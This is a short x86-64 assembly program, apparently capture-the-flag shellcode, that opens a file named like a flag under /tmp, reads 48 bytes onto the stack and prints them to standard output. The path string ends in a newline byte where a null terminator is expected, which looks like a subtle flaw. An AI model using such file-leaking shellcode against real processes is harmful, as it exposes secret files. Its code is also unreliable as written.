section .data
    fpath db "/tmp/flag_name_is_loooooong", 0ah
section .text
    global _start
_start:
    mov rax, 0x02
    mov rdi, fpath
    xor rsi, rsi
    xor rdx, rdx
    syscall
    ;
    mov rdi, rax
    mov rax, 0x00
    mov rsi, rsp
    sub rsi, 0x30
    mov rdx, 0x30
    syscall
    ;
    mov rax, 0x01
    mov rdi, 1
    syscall
